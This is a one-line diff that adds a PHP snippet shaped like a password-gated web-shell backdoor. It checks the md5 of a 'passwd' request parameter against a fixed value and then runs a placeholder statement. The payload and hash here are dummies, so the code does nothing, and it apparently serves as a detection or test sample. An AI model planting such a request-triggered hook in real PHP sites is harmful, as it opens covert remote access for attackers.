@@ -1,0 +1,1 @@
+<?php if(md5($_REQUEST["passwd"])=="8888"){9999;} ?>
